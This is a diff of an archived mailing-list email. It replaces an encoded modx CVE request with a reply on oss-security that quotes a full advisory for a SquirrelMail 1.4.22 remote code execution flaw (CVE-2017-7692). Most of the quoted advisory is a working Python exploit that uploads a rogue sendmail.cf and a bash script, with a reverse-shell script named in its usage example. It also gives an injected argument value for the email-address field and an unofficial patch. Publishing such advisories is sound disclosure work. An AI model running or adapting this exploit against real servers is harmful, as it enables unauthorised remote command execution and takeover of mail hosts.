@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2206" "Thursday" "8" "December" "2016" "10:41:35" "+0000" "=?gb2312?B?s8LI8Of5?=" "chenruiqi@b.360.cn" "<1481193767048.41772@b.360.cn>" "41" "[oss-security] CVE Request: file inclusion(traversal/manipulation) in modx revolution 2.5.1" nil nil nil "12" "2016120810:41:35" "[oss-security] CVE Request: file inclusion(traversal/manipulation) in modx revolution 2.5.1" (number mark "U       chenruiqi@b. Dec  8   41/2206  " thread-indent "\"[oss-security] CVE Request: file inclusion(traversal/manipulation) in modx revolution 2.5.1\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["16892" "Wednesday" "19" "April" "2017" "11:37:13" "-0300" "Dawid Golunski" "dawid@legalhackers.com" "<CADSYzssu2X06FJDH3u0sQoAhPRuOBpEonncGMws4nW7RR7KNNw@mail.gmail.com>" "492" "Re: [oss-security] CVE-2017-7692: Squirrelmail 1.4.22 Remote Code Execution" nil nil nil "4" "2017041914:37:13" "[oss-security] CVE-2017-7692: Squirrelmail 1.4.22 Remote Code Execution" (number mark "U       dawid@legalh Apr 19  492/16892 " thread-indent "\"Re: [oss-security] CVE-2017-7692: Squirrelmail 1.4.22 Remote Code Execution\"\n") "<38CC500D-54E8-4035-B3B5-86D252BAE10F@wearesegment.com>" ("<38CC500D-54E8-4035-B3B5-86D252BAE10F@wearesegment.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 24245 invoked by uid 550); 8 Dec 2016 14:15:11 -0000
+Received: (qmail 24301 invoked by uid 550); 19 Apr 2017 14:37:27 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,69 +12,533 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 13924 invoked from network); 8 Dec 2016 10:43:04 -0000
-X-MAILFROM: <chenruiqi@b.360.cn>
-X-RCPTTO: <oss-security@lists.openwall.com>
-X-FROMIP: 172.24.0.16
-X-EQManager-Scaned: 1
-X-Received:bogon,172.24.0.16,20161208180752
-From: =?gb2312?B?s8LI8Of5?= <chenruiqi@b.360.cn>
-To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
-Thread-Topic: CVE Request: file inclusion(traversal/manipulation) in modx
- revolution 2.5.1
-Thread-Index: AQHSUT8gbQWjQfC/nUqcRsswxcSJZA==
-Date: Thu, 8 Dec 2016 10:41:35 +0000
-Message-ID: <1481193767048.41772@b.360.cn>
-Accept-Language: zh-CN, en-US
-Content-Language: zh-CN
-X-MS-Has-Attach:
-X-MS-TNEF-Correlator:
-x-ms-exchange-transport-fromentityheader: Hosted
-x-originating-ip: [10.74.0.10]
-Content-Type: multipart/alternative;
-	boundary="_000_148119376704841772b360cn_"
+Received: (qmail 24275 invoked from network); 19 Apr 2017 14:37:26 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=legalhackers-com.20150623.gappssmtp.com; s=20150623;
+        h=mime-version:in-reply-to:references:from:date:message-id:subject:to
+         :content-transfer-encoding;
+        bh=DoxYeG+6UJa8tVV37RBjAt/DwhYV877twVC7MJ0DBZM=;
+        b=lOT42sWXGhMYSZQkXBMoc8+xy1i5cIJso/9xyMwK5f3khzQ8uChrWQTLhzjJ+wLZQ9
+         yYePayiHMVoWz1xw6LonxsrZboV4UMmx98mPtbVKbx0o1Y2K9t0eB+uGH9Vp3Mv9A/ZJ
+         MTJJ8YunVPafYtIzYFVfBVSVIc+zCVNxVpyYzy+yszwv0NhPzHu8Djd2iMjW/xDGtfUJ
+         3BjVyo7oM99rZkELgAtGjdCJDS57CKoUmu1xu0/q2veXh+fqoTOjFEeTJxKqPf7E7WMZ
+         ya6rnny0LWT9FLfRJ33/wqBn4xkyfZHYtEXpcKNy3GJftdYx6UnXjVi7jKuwqpiGRRKu
+         mzPA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
+         :message-id:subject:to:content-transfer-encoding;
+        bh=DoxYeG+6UJa8tVV37RBjAt/DwhYV877twVC7MJ0DBZM=;
+        b=jsMx3qWcxqKUXXsiCgxzgvRDF56C1CB6YSkWK4xpuLHKJ4jNnh4AZTdJAWtRXx+DcJ
+         pp/LrgsITHcHOzwJqkf0wZ+SysCNqtuBLmlTdEKnIJXGDwKZh5UXwA25cMMk2ktrIcF3
+         +W/+qUuzUGIbAyR15KJzMhLJ04Um+W4E2rKve6+tNDqrJkieC2AQKV9wtWx1kxfLVwJS
+         pqele3WZ8/FuYpVYnxc0sc+dSPtvwxD/Jyi0eAlJd3RmiutQw7W9Ypz/lgpsq0vzzBVW
+         coGcZc+vi19+EI7OPgFRRYxYZrgFPyjURgRz/h7RNqjEVQR5BIsKpLOwd4EsOotYsoqo
+         DutA==
+X-Gm-Message-State: AN3rC/5iSzQr78RNgKr9VYtLmrk6QGM6NL4KNaMLXp2RgMJ7AwTtVA+U
+	v4Yw+Sn4uzJa4/s7+aeFpk1HwOYhmuuI
+X-Received: by 10.31.199.4 with SMTP id x4mr1306563vkf.35.1492612633795; Wed,
+ 19 Apr 2017 07:37:13 -0700 (PDT)
 MIME-Version: 1.0
-Subject: [oss-security] CVE Request: file inclusion(traversal/manipulation) in modx
- revolution 2.5.1
+In-Reply-To: <38CC500D-54E8-4035-B3B5-86D252BAE10F@wearesegment.com>
+References: <38CC500D-54E8-4035-B3B5-86D252BAE10F@wearesegment.com>
+From: Dawid Golunski <dawid@legalhackers.com>
+Date: Wed, 19 Apr 2017 11:37:13 -0300
+Message-ID: <CADSYzssu2X06FJDH3u0sQoAhPRuOBpEonncGMws4nW7RR7KNNw@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+Subject: Re: [oss-security] CVE-2017-7692: Squirrelmail 1.4.22 Remote Code Execution
 
---_000_148119376704841772b360cn_
-Content-Type: text/plain; charset="gb2312"
-Content-Transfer-Encoding: base64
+Hi Filippo,
 
-SSBmb3VuZCBhIGZpbGUgaW5jbHVzaW9uKHRyYXZlcnNhbC9tYW5pcHVsYXRp
-b24pIHZ1bG4gaW4gbW9keCByZXZvbHV0aW9uIDIuNS4xDQoNCg0KVGl0bGU6
-IFBhdGggdHJhdmVsIGluIG1vZHggdmVyc2lvbiAyLjUuMQ0KQXV0aG9yOiBD
-aGVuIFJ1aXFpLCBDaGVucnVpcWlAYi4zNjAuY24sIEBDb2Rlc2FmZSBUZWFt
-DQpEb3dubG9hZCBTaXRlOiB3d3cubW9keC5jb208aHR0cDovL3d3dy5tb2R4
-LmNvbS8+DQpWZW5kb3I6IG1vZHgNClZlbmRvciBDb250YWN0OiBzZWN1cml0
-eUBtb2R4LmNvbQ0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCkRpc2NyaXB0aW9uOg0KTU9E
-WCAob3JpZ2luYWxseSBNT0R4KSBpcyBhIGZyZWUsIG9wZW4gc291cmNlIGNv
-bnRlbnQgbWFuYWdlbWVudCBzeXN0ZW0gYW5kIHdlYiBhcHBsaWNhdGlvbiBm
-cmFtZXdvcmsgZm9yIHB1Ymxpc2hpbmcgY29udGVudCBvbiB0aGUgd29ybGQg
-d2lkZSB3ZWIgYW5kIGludHJhbmV0cy4gTU9EWCBpcyBsaWNlbnNlZCB1bmRl
-ciB0aGUgR1BMLCBpcyB3cml0dGVuIGluIHRoZSBQSFAgcHJvZ3JhbW1pbmcg
-bGFuZ3VhZ2UsIGFuZCBzdXBwb3J0cyBNeVNRTCBhbmQgTWljcm9zb2Z0IFNR
-TCBTZXJ2ZXIgYXMgdGhlIGRhdGFiYXNlLiBJdCB3YXMgYXdhcmRlZCBQYWNr
-dCBQdWJsaXNoaW5nJ3MgTW9zdCBQcm9taXNpbmcgT3BlbiBTb3VyY2UgQ29u
-dGVudCBNYW5hZ2VtZW50IFN5c3RlbSBpbiAyMDA3LlsxXSh3aWtpKQ0KLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0NClZ1bG5lcmFiaWxpdHk6DQpCeSB1c2luZyByZWxh
-dGl2ZSBwYXRocyBhbmQgZ3Vlc3NpbmcgbG9jYXRpb25zIG9uIGEgc2VydmVy
-IG1vZHggaXMgaW5zdGFsbGVkIG9uLCBhbiBhdHRhY2tlciBjYW4gZ2V0IHRo
-ZSBmaWxlIHN5c3RlbSBzdHJ1Y3R1cmUgYW5kIGRlbGV0ZSBhbnkgZm9sZGVy
-IGZyb20gYSB0YXJnZXQgc2VydmVyIHRoYXQgdGhlIHByb2Nlc3MgcnVubmlu
-ZyBtb2R4IGhhcyBwZXJtaXNzaW9uLiBUaGUgYXR0YWNrZXIgbmVlZHMgYWRt
-aW5pc3RyYXRvciBwcml2aWxlZ2VzIG9uIHRoZSBtb2R4IHNpdGUgdG8gcGVy
-Zm9ybSB0aGlzIGF0dGFjay4NCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KRml4Og0K
-DQpodHRwczovL2dpdGh1Yi5jb20vbW9keGNtcy9yZXZvbHV0aW9uL3B1bGwv
-MTMxNzcNCg0KdXBkYXRlIHRvIHZlcnNpb24gMi41LjINCg0KDQpDb3VsZCB5
-b3UgYXNzaWduIENWRSBJRCBmb3IgdGhpcz8NCg0KDQpUaGFuayB5b3UNCg0K
-Q2hlbiBSdWlxaQ0KQ29kZXNhZmUgVGVhbQ0KDQoNCg==
+I actually reported this vulnerability to the vendor at the beginning
+of this year.  I also got the following CVEID assigned for it in
+January: CVE-2017-5181.
+I was waiting on the vendor to patch the vulnerability since then
+before I publish the details.
 
---_000_148119376704841772b360cn_--
+Has he got back to you?
 
+On Wed, Apr 19, 2017 at 10:14 AM, Filippo Cavallarin
+<filippo.cavallarin@wearesegment.com> wrote:
+> Advisory ID:           SGMA17-001
+> Title:                 Squirrelmail Remote Code Execution
+> Product:               Squirrelmail
+> Version:               1.4.22 and probably prior
+> Vendor:                squirrelmail.org
+> Type:                  Command Injection
+> Risk level:            4 / 5
+> Credit:                filippo.cavallarin@wearesegment.com
+> CVE:                   CVE-2017-7692
+> Vendor notification:   2017-04-04
+> Vendor fix:            N/A
+> Public disclosure:     2017-04-19
+>
+>
+>
+>
+> DETAILS
+>
+> Squirrelmail version 1.4.22 (and probably prior) is vulnerable to a remot=
+e code execution vulnerability because
+> it fails to sanitize a string before passing it to a popen call. It's pos=
+sible to exploit this vulnerability to
+> execute arbitrary shell commands on the remote server.
+>
+> The problem is in Deliver_SendMail.class.php on initStream function that =
+uses escapeshellcmd() to sanitize the
+> sendmail command before executing it. The use of escapeshellcmd() is not =
+correct in this case since it don't
+> escapes whitespaces allowing the injection of arbitrary command parameter=
+s.
+>
+>       $this->sendmail_command =3D "$sendmail_path $this->sendmail_args -f=
+$envelopefrom";
+>       $stream =3D popen(escapeshellcmd($this->sendmail_command), "w");
+>
+>
+> The $envelopefrom variable is controlled by the attacker, hence it's poss=
+ible to trick sendmail to use an
+> attacker-provided configuration file that triggers the execution of an ar=
+bitrary command.
+>
+> In order to exploit this vulnerability the MTA in use must be sendmail an=
+d Squirrelmail must be configured
+> to use it as commandline (useSendmail directive of the config file set to=
+ true).
+> Also, the edit_identity directive of the config file must be bet to true,=
+ but this is the default configuration.
+>
+> To reproduce the issue follow these steps:
+>         1. Create a rogue sendmail.cf that triggers the execution of a /u=
+sr/bin/touch:
+>                 [...]
+>                 Mlocal,         P=3D/usr/bin/touch, F=3DlsDFMAw5:/|@qPn9S=
+, S=3DEnvFromL/HdrFromL, R=3DEnvToL/HdrToL,
+>                 T=3DDNS/RFC822/X-Unix,
+>                 A=3DX /tmp/executed
+>         2. Upload it as a mail attachment and get it's remote name (ex: l=
+F51mGPJwdqzV3LEDlCdSVNpohzgF7sD)
+>         3. Go to Options -> Personal Informations and set the following p=
+ayload as Email Address:
+>                 <aaa@abc.com -OQueueDirectory=3D/tmp  -C /var/local/squir=
+relmail/attach/lF51mGPJwdqzV3LEDlCdSVNpohzgF7sD>
+>         4. Send an email
+>         5. Verify the execution of the command with "ls /tmp/executed" on=
+ the remote server
+>
+>
+>
+>
+> PROOF OF CONCEPT
+>
+> The followig python script exploits this vulnerability to execute an atta=
+cker provided bash script on the remote server.
+>
+> BOF
+> #!/usr/bin/env python
+> # -*- coding: utf-8 -*-
+>
+> """
+>
+> SquirrelMail 1.4.22 Remote Code Execution (authenticated)
+> Exploit code for CVE-2017-7692
+> filippo.cavallarin@wearesegment.com
+>
+> """
+>
+> from __future__ import unicode_literals
+> import sys
+> import os
+> import re
+> import requests
+>
+> reload(sys)
+> sys.setdefaultencoding('utf8')
+>
+>
+> SENDMAILCF=3D"/tmp/squirrelmail1_4_22-sendmailcf-rce"
+> COMPOSE =3D "/src/compose.php"
+> INFOS =3D "/src/options.php?optpage=3Dpersonal"
+> SQM_ATTACH_PATH =3D "/var/local/squirrelmail/attach/"
+> # must be enclosed in <> otherwise spaces will be removed ..
+> SENDER =3D "<px@xxxx.com -OQueueDirectory=3D/tmp  -C %s%s>"
+>
+>
+> SESSID =3D ""
+> BASEURL =3D ""
+>
+>
+> def attach(attachment):
+>   url =3D "%s%s" % (BASEURL, COMPOSE)
+>   token =3D get_csrf_token(url)
+>
+>   values =3D {
+>     "smtoken": token,
+>     "attach": "add"
+>   }
+>
+>   try:
+>     files =3D {'attachfile': open(attachment,'rb')}
+>     resp =3D requests.post(url, files=3Dfiles, data=3Dvalues, cookies=3D{=
+'SQMSESSID':SESSID})
+>     fname =3D re.search(r'att_local_name&quot;;s:[0-9]+:&quot;([a-zA-Z0-9=
+]+)&quot;', resp.text)
+>     if not fname:
+>       print "\nError: unable to upload file %s" % attachment
+>     return fname.group(1)
+>
+>   except Exception as e:
+>     print "\nError: %s" % e
+>     sys.exit(1)
+>
+>
+> def send():
+>   url =3D "%s%s" % (BASEURL, COMPOSE)
+>   token =3D get_csrf_token(url)
+>
+>   values =3D {
+>     "smtoken": token,
+>     "send_to": "root",
+>     "send": "Send"
+>   }
+>
+>   try:
+>     resp =3D requests.post(url, data=3Dvalues, cookies=3D{'SQMSESSID':SES=
+SID})
+>   except Exception as e:
+>     print "\nError: %s" % e
+>     sys.exit(1)
+>
+>
+> def set_identity(sender):
+>   url =3D "%s%s" % (BASEURL, INFOS)
+>   token =3D get_csrf_token(url)
+>   values =3D {
+>     "smtoken": token,
+>     "optpage": "personal",
+>     "optmode": "submit",
+>     "new_email_address": sender,
+>     "submit_personal": "Submit"
+>   }
+>
+>   try:
+>     requests.post(url, data=3Dvalues, cookies=3D{'SQMSESSID':SESSID})
+>   except Exception as e:
+>     print "\nError: %s" % e
+>     sys.exit(1)
+>
+>
+> def get_csrf_token(url):
+>   try:
+>     body =3D requests.get(url, cookies=3D{'SQMSESSID':SESSID}).text
+>     inp =3D re.search(r'<input.*name=3D"smtoken".*>', body, re.MULTILINE)
+>     token =3D re.search(r'value=3D"([a-zA-Z0-9]+)"', inp.group(0))
+>     if token:
+>       return token.group(1)
+>   except Exception as e:
+>     pass
+>
+>   print "\nUnable to get CSRF token"
+>   sys.exit(1)
+>
+> def outw(s):
+>   sys.stdout.write(s)
+>   sys.stdout.flush()
+>
+> def main(argv):
+>   global BASEURL
+>   global SESSID
+>
+>   if len(argv) !=3D 4:
+>     print (
+>         "SquirrelMail 1.4.22 Remote Code Execution (authenticated) - fili=
+ppo.cavallarin@wearesegment.com\n"
+>         "The target server must use sendmail and squirrelmail must be con=
+figured to use /usr/bin/sendmail\n"
+>         "Usage:\n"
+>         "  %s <url> <session_id> <script>\n"
+>         "      url: the url of squirrelmail\n"
+>         "      session_id: the value of SQMSESSID cookie\n"
+>         "      script: the path to the bash script to be executed on the =
+target\n"
+>         "Example:\n"
+>         "  %s http:/example.com/squirrelmail/ l2rapvcovsui1on0b4i5boev24 =
+reverseshell.sh"
+>       ) % (argv[0], argv[0])
+>
+>     sys.exit(1)
+>
+>   BASEURL =3D argv[1]
+>   SESSID =3D argv[2]
+>   script =3D argv[3]
+>
+>   outw("Uploading script ... ")
+>   script_fname =3D attach(script)
+>   print "ok"
+>
+>
+>   outw("Generating sendmail.cf ... ")
+>   try:
+>     script_path =3D "%s%s" % (SQM_ATTACH_PATH, script_fname)
+>     with open(SENDMAILCF, 'w') as f:
+>       f.write(SENDMAILCF_CONTENT % script_path)
+>   except Exception as e:
+>     print "\nError: %s" % e
+>     sys.exit(1)
+>   print "ok"
+>
+>   outw("Uploading sendmail.cf ... ")
+>   smc_fname =3D attach(SENDMAILCF)
+>   os.remove(SENDMAILCF)
+>   print "ok"
+>
+>   outw("Updating user options ... ")
+>   sender =3D SENDER % (SQM_ATTACH_PATH, smc_fname)
+>   set_identity(sender)
+>   print "ok"
+>
+>   outw("Checking identity field ... ")
+>   icheck =3D requests.get("%s%s" % (BASEURL, INFOS), cookies=3D{'SQMSESSI=
+D':SESSID}).text
+>   if not smc_fname in icheck:
+>     print "\nError: unable to set identity field .. maybe squirrelmail is=
+ configured with edit_identity=3Dfalse"
+>     sys.exit(1)
+>   print "ok"
+>
+>   outw("Executing script ... ")
+>   send()
+>   print "ok\n"
+>   sys.exit(0)
+>
+> SENDMAILCF_CONTENT =3D """
+> O DontBlameSendmail=3D,AssumeSafeChown,ForwardFileInGroupWritableDirPath,=
+GroupWritableForwardFileSafe,GroupWritableIncludeFileSafe,IncludeFileInGrou=
+pWritableDirPath,DontWarnForwardFileInUnsafeDirPath,TrustStickyBit,NonRootS=
+afeAddr,GroupWritableIncludeFile,GroupReadableDefaultAuthInfoFile
+> Kdequote dequote
+> Scanonify=3D3
+> R$@     $@ <@>
+> R$*     $: $1 <@>     mark addresses
+> R$* < $* > $* <@> $: $1 < $2 > $3     unmark <addr>
+> R@ $* <@>   $: @ $1       unmark @host:...
+> R$* [ IPv6 : $+ ] <@> $: $1 [ IPv6 : $2 ]   unmark IPv6 addr
+> R$* :: $* <@>   $: $1 :: $2     unmark node::addr
+> R:include: $* <@> $: :include: $1     unmark :include:...
+> R$* : $* [ $* ]   $: $1 : $2 [ $3 ] <@>   remark if leading colon
+> R$* : $* <@>    $: $2       strip colon if marked
+> R$* <@>     $: $1       unmark
+> R$* ;        $1       strip trailing semi
+> R$* < $+ :; > $*  $@ $2 :; <@>      catch <list:;>
+> R$* < $* ; >       $1 < $2 >      bogus bracketed semi
+> R$@     $@ :; <@>
+> R$*     $: < $1 >     housekeeping <>
+> R$+ < $* >       < $2 >     strip excess on left
+> R< $* > $+       < $1 >     strip excess on right
+> R<>     $@ < @ >      MAIL FROM:<> case
+> R< $+ >     $: $1       remove housekeeping <>
+> R@ $+ , $+    $2
+> R@ [ $* ] : $+    $2
+> R@ $+ : $+    $2
+> R $+ : $* ; @ $+  $@ $>Canonify2 $1 : $2 ; < @ $3 > list syntax
+> R $+ : $* ;   $@ $1 : $2;     list syntax
+> R$+ @ $+    $: $1 < @ $2 >      focus on domain
+> R$+ < $+ @ $+ >   $1 $2 < @ $3 >      move gaze right
+> R$+ < @ $+ >    $@ $>Canonify2 $1 < @ $2 >  already canonical
+> R$- ! $+    $@ $>Canonify2 $2 < @ $1 .UUCP >  resolve uucp names
+> R$+ . $- ! $+   $@ $>Canonify2 $3 < @ $1 . $2 >   domain uucps
+> R$+ ! $+    $@ $>Canonify2 $2 < @ $1 .UUCP >  uucp subdomains
+> R$* %% $*   $1 @ $2       First make them all @s.
+> R$* @ $* @ $*   $1 %% $2 @ $3     Undo all but the last.
+> R$* @ $*    $@ $>Canonify2 $1 < @ $2 >  Insert < > and finish
+> R$*     $@ $>Canonify2 $1
+> SCanonify2=3D96
+> R$* < @ localhost > $*    $: $1 < @ $j . > $2   no domain at all
+> R$* < @ localhost . $m > $* $: $1 < @ $j . > $2   local domain
+> R$* < @ localhost . UUCP > $* $: $1 < @ $j . > $2   .UUCP domain
+> R$* < @ [ $+ ] > $*   $: $1 < @@ [ $2 ] > $3    mark [addr]
+> R$* < @@ $=3Dw > $*   $: $1 < @ $j . > $3   self-literal
+> R$* < @@ $+ > $*    $@ $1 < @ $2 > $3   canon IP addr
+> Sfinal=3D4
+> R$+ :; <@>    $@ $1 :       handle <list:;>
+> R$* <@>     $@        handle <> and list:;
+> R$* < @ $+ . > $* $1 < @ $2 > $3
+> R$* < @ *LOCAL* > $*  $1 < @ $j > $2
+> R$* < $+ > $*   $1 $2 $3      defocus
+> R@ $+ : @ $+ : $+ @ $1 , @ $2 : $3    <route-addr> canonical
+> R@ $*     $@ @ $1       ... and exit
+> R$+ @ $- . UUCP   $2!$1       u@h.UUCP =3D> h!u
+> R$+ %% $=3Dw @ $=3Dw    $1 @ $2       u%%host@host =3D> u@host
+> SRecurse=3D97
+> R$*     $: $>canonify $1
+> R$*     $@ $>parse $1
+> Sparse=3D0
+> R$*     $: $>Parse0 $1    initial parsing
+> R<@>      $#local $: <@>    special case error msgs
+> R$*     $: $>ParseLocal $1  handle local hacks
+> R$*     $: $>Parse1 $1    final parsing
+> SParse0
+> R<@>      $@ <@>      special case error msgs
+> R$* : $* ; <@>    $#error $@ 5.1.3 $: "553 List:; syntax illegal for reci=
+pient addresses"
+> R@ <@ $* >    < @ $1 >    catch "@@host" bogosity
+> R<@ $+>     $#error $@ 5.1.3 $: "553 User address required"
+> R$+ <@>     $#error $@ 5.1.3 $: "553 Hostname required"
+> R$*     $: <> $1
+> R<> $* < @ [ $* ] : $+ > $* $1 < @ [ $2 ] : $3 > $4
+> R<> $* < @ [ $* ] , $+ > $* $1 < @ [ $2 ] , $3 > $4
+> R<> $* < @ [ $* ] $+ > $* $#error $@ 5.1.2 $: "553 Invalid address"
+> R<> $* < @ [ $+ ] > $*    $1 < @ [ $2 ] > $3
+> R<> $* <$* : $* > $*  $#error $@ 5.1.3 $: "553 Colon illegal in host name=
+ part"
+> R<> $*      $1
+> R$* < @ . $* > $* $#error $@ 5.1.2 $: "553 Invalid host name"
+> R$* < @ $* .. $* > $* $#error $@ 5.1.2 $: "553 Invalid host name"
+> R$* < @ $* @ > $* $#error $@ 5.1.2 $: "553 Invalid route address"
+> R$* @ $* < @ $* > $*  $#error $@ 5.1.3 $: "553 Invalid route address"
+> R$* , $~O $*    $#error $@ 5.1.3 $: "553 Invalid route address"
+> R$* < @ > $*    $@ $>Parse0 $>canonify $1 user@ =3D> user
+> R< @ $=3Dw . > : $* $@ $>Parse0 $>canonify $2 @here:... -> ...
+> R$- < @ $=3Dw . >   $: $(dequote $1 $) < @ $2 . > dequote "foo"@here
+> R< @ $+ >   $#error $@ 5.1.3 $: "553 User address required"
+> R$* $=3DO $* < @ $=3Dw . >  $@ $>Parse0 $>canonify $1 $2 $3 ...@here -> .=
+..
+> R$-       $: $(dequote $1 $) < @ *LOCAL* >  dequote "foo"
+> R< @ *LOCAL* >    $#error $@ 5.1.3 $: "553 User address required"
+> R$* $=3DO $* < @ *LOCAL* >
+>       $@ $>Parse0 $>canonify $1 $2 $3 ...@*LOCAL* -> ...
+> R$* < @ *LOCAL* > $: $1
+> SParse1
+> R$* < @ [ $+ ] > $* $: $>ParseLocal $1 < @ [ $2 ] > $3  numeric internet =
+spec
+> R$* < @ [ $+ ] > $* $: $1 < @ [ $2 ] : $S > $3  Add smart host to path
+> R$* < @ [ $+ ] : > $*   $#esmtp $@ [$2] $: $1 < @ [$2] > $3 no smarthost:=
+ send
+> R$* < @ [ $+ ] : $- : $*> $*  $#$3 $@ $4 $: $1 < @ [$2] > $5  smarthost w=
+ith mailer
+> R$* < @ [ $+ ] : $+ > $*  $#esmtp $@ $3 $: $1 < @ [$2] > $4 smarthost wit=
+hout mailer
+> R$=3DL < @ $=3Dw . >  $#local $: @ $1     special local names
+> R$+ < @ $=3Dw . >   $#local $: $1     regular local name
+> R$* < @ $* > $*   $: $>MailerToTriple < $S > $1 < @ $2 > $3 glue on smart=
+host name
+> R$* < @$* > $*    $#esmtp $@ $2 $: $1 < @ $2 > $3 user@host.domain
+> R$=3DL      $#local $: @ $1   special local names
+> R$+     $#local $: $1     regular local names
+> SLocal_localaddr
+> Slocaladdr=3D5
+> R$+     $: $1 $| $>"Local_localaddr" $1
+> R$+ $| $#ok   $@ $1     no change
+> R$+ $| $#$*   $#$2
+> R$+ $| $*   $: $1
+> R$+ + *     $#local $@ $&h $: $1
+> R$+ + $*    $#local $@ + $2 $: $1 + *
+> R$+     $: <> $1
+> R< > $+     $: < > < $1 <> $&h >    nope, restore +detail
+> R< > < $+ <> + $* > $: < > < $1 + $2 >    check whether +detail
+> R< > < $+ <> $* > $: < > < $1 >     else discard
+> R< > < $+ + $* > $*    < > < $1 > + $2 $3   find the user part
+> R< > < $+ > + $*  $#local $@ $2 $: @ $1   strip the extra +
+> R< > < $+ >   $@ $1       no +detail
+> R$+     $: $1 <> $&h      add +detail back in
+> R$+ <> + $*   $: $1 + $2      check whether +detail
+> R$+ <> $*   $: $1       else discard
+> R< local : $* > $*  $: $>MailerToTriple < local : $1 > $2 no host extensi=
+on
+> R< error : $* > $*  $: $>MailerToTriple < error : $1 > $2 no host extensi=
+on
+> R< $~[ : $+ > $+  $: $>MailerToTriple < $1 : $2 > $3 < @ $2 >
+> R< $+ > $+    $@ $>MailerToTriple < $1 > $2 < @ $1 >
+> SParseLocal=3D98
+> SEnvFromL
+> R<@>      $n      errors to mailer-daemon
+> R@ <@ $*>   $n      temporarily bypass Sun bogosity
+> R$+     $: $>AddDomain $1 add local domain if needed
+> R$*     $: $>MasqEnv $1   do masquerading
+> SEnvToL
+> R$+ < @ $* >    $: $1     strip host part
+> R$+ + $*    $: < $&{addr_type} > $1 + $2  mark with addr type
+> R<e s> $+ + $*    $: $1     remove +detail for sender
+> R< $* > $+    $: $2     else remove mark
+> SHdrFromL
+> R<@>      $n      errors to mailer-daemon
+> R@ <@ $*>   $n      temporarily bypass Sun bogosity
+> R$+     $: $>AddDomain $1 add local domain if needed
+> R$*     $: $>MasqHdr $1   do masquerading
+> SHdrToL
+> R$+     $: $>AddDomain $1 add local domain if needed
+> R$*     $: $>MasqHdr $1   do all-masquerading
+> SAddDomain
+> R$* < @ $* > $*   $@ $1 < @ $2 > $3 already fully qualified
+> R$+     $@ $1 < @ *LOCAL* > add local qualification
+> Mlocal,   P=3D/bin/bash, F=3DlsDFMAw5:/|@qPn9S, S=3DEnvFromL/HdrFromL, R=
+=3DEnvToL/HdrToL,
+>     T=3DDNS/RFC822/X-Unix,
+>     A=3DX %s
+> Mprog,    P=3D/bin/sh, F=3DlsDFMoqeu9, S=3DEnvFromL/HdrFromL, R=3DEnvToL/=
+HdrToL, D=3D$z:/,
+>     T=3DX-Unix/X-Unix/X-Unix,
+>     A=3Dsh -c $u
+>
+> """
+>
+> if __name__ =3D=3D '__main__':
+>   main(sys.argv)
+>
+> EOF
+>
+>
+>
+>
+> SOLUTION
+>
+> Since the vendor did not respond to our mails, no official fix is availab=
+le.
+> However, the following unofficial patch can be used to fix this vulnerabi=
+lity.
+>
+> BOF
+> diff -ruN squirrelmail-webmail-1.4.22/class/deliver/Deliver_SendMail.clas=
+s.php squirrelmail-webmail-1.4.22-fix-CVE-2017-7692/class/deliver/Deliver_S=
+endMail.class.php
+> --- squirrelmail-webmail-1.4.22/class/deliver/Deliver_SendMail.class.php =
+ 2011-01-06 02:44:03.000000000 +0000
+> +++ squirrelmail-webmail-1.4.22-fix-CVE-2017-7692/class/deliver/Deliver_S=
+endMail.class.php  2017-04-18 11:42:26.505181944 +0000
+> @@ -93,9 +93,9 @@
+>          $envelopefrom =3D trim($from->mailbox.'@'.$from->host);
+>          $envelopefrom =3D str_replace(array("\0","\n"),array('',''),$env=
+elopefrom);
+>          // save executed command for future reference
+> -        $this->sendmail_command =3D "$sendmail_path $this->sendmail_args=
+ -f$envelopefrom";
+> +        $this->sendmail_command =3D escapeshellcmd("$sendmail_path $this=
+->sendmail_args -f") . escapeshellarg($envelopefrom);
+>          // open process handle for writing
+> -        $stream =3D popen(escapeshellcmd($this->sendmail_command), "w");
+> +        $stream =3D popen($this->sendmail_command, "w");
+>          return $stream;
+>      }
+> EOF
+>
+>
+>
+>
+> REFERENCES
+>
+> https://squirrelmail.org/
+> https://www.wearesegment.com/research/Squirrelmail-Remote-Code-Execution.=
+html
+>
+>
+>
+
+
+
+--=20
+Regards,
+Dawid Golunski
+https://legalhackers.com
+t: @dawid_golunski
